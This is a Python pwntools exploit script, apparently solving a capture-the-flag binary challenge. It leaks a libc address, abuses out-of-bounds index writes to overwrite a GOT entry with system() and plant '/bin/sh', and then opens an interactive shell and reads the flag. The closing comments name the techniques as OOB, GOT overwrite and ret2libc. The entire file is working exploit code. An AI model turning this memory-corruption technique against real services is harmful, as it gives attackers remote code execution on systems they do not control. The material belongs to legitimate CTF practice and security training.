#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld.so', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

p.recvuntil(b'<3: ')
libc.address = int(p.recvline()[:-1].strip(),16) - libc.sym.wctomb
system = libc.sym.system
print(f"libc base : {hex(libc.address)}")

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'-17')
p.sendlineafter(b'(hex): ', hex(system).encode())

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'-4')
p.sendlineafter(b'(hex): ', hex(0x68732f6e69622f).encode())

p.sendlineafter(b'> ', b'2')

p.sendline(b'cat flag*')

p.interactive()

# NOTE:
# OOB
# GOT Overwrite
# Ret2libc
